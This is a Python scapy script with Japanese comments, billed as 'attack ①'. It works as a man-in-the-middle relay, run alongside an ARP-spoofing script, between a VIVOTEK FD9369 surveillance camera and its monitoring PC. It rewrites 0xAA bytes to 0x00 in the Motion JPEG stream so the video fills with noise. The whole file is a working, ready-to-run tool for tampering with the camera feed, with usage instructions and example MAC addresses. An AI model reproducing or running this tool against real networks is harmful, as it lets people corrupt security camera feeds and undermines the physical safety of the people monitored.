#!/usr/bin/env python3
"""
vivotek_attack1_noise.py - 攻撃① ペイロード改ざんによる映像ノイズ発生
対象: VIVOTEK FD9369 (Motion JPEG over HTTP)

監視カメラ→PCの通信をリレーする際に、
ペイロード内の 0xAA を 0x00 に書き換えてノイズを発生させる。

使い方:
  1. arp_spoofing.py を先に起動
  2. 本スクリプトを別ターミナルで実行

  python vivotek_attack1_noise.py --camera-mac 08:00:23:9C:31:FF \\
      --monitor-mac D0:BF:9C:E2:25:2D --attacker-mac A0:CE:C8:A4:EB:D5
"""

import argparse
from scapy.all import *

TCP.payload_guess = []  # ポート番号による自動解析を無効化


def main():
    parser = argparse.ArgumentParser(
        description="攻撃① 0xAA→0x00 書き換えによる映像ノイズ (VIVOTEK FD9369)")
    parser.add_argument("--camera-mac", required=True,
                        help="監視カメラの MAC アドレス")
    parser.add_argument("--monitor-mac", required=True,
                        help="監視端末の MAC アドレス")
    parser.add_argument("--attacker-mac", required=True,
                        help="攻撃用 PC の MAC アドレス")
    parser.add_argument("--iface", default="イーサネット",
                        help="ネットワークインターフェース名 (デフォルト: イーサネット)")
    args = parser.parse_args()

    mac0 = args.attacker_mac.lower()  # 攻撃PC
    mac1 = args.camera_mac.lower()    # 監視カメラ
    mac2 = args.monitor_mac.lower()   # 監視PC
    IF = args.iface

    FILT = "tcp port 80 and ether dst " + mac0

    # JPEGフレーム内かどうかを追跡するフラグ
    state = {"in_jpeg": False}

    def maeta(frame):
        if frame[Ether].src.lower() == mac1:
            # カメラ → 監視PC: 宛先を監視PCに書き換え
            frame[Ether].dst = mac2

            if frame.getlayer(TCP) and frame.getlayer(Raw):
                if frame[TCP].sport == 80:
                    payload = frame[Raw].load

                    # JPEGフレーム開始 (0xFFD8) を検出 → フラグON
                    if b'\xff\xd8' in payload:
                        state["in_jpeg"] = True

                    # JPEGフレーム終了 (0xFFD9) を検出 → このパケットも改ざんしてからフラグOFF
                    has_jpeg_end = b'\xff\xd9' in payload

                    # JPEGフレーム内のパケットを改ざん
                    if state["in_jpeg"]:
                        tmp = payload.replace(b'\xaa', b'\x00')
                        frame[Raw].load = tmp
                        frame[TCP].chksum = None
                        frame[IP].chksum = None
                        frame[IP].len = None

                    if has_jpeg_end:
                        state["in_jpeg"] = False

        elif frame[Ether].src.lower() == mac2:
            # 監視PC → カメラ: そのまま転送
            frame[Ether].dst = mac1
        else:
            return

        frame[Ether].src = mac0
        frame.show()
        sendp(frame, iface=IF)

    print("=" * 55)
    print("  攻撃① 0xAA→0x00 書き換え (映像ノイズ)")
    print("  対象: VIVOTEK FD9369 (Motion JPEG)")
    print("=" * 55)
    print(f"  カメラ   MAC : {mac1}")
    print(f"  監視PC   MAC : {mac2}")
    print(f"  攻撃PC   MAC : {mac0}")
    print(f"  フィルタ      : {FILT}")
    print("=" * 55)
    print("[*] パケット中継開始... (Ctrl+C で終了)")
    print()

    conf.verb = False
    sniff(iface=IF, filter=FILT, store=0, prn=maeta)


if __name__ == "__main__":
    main()
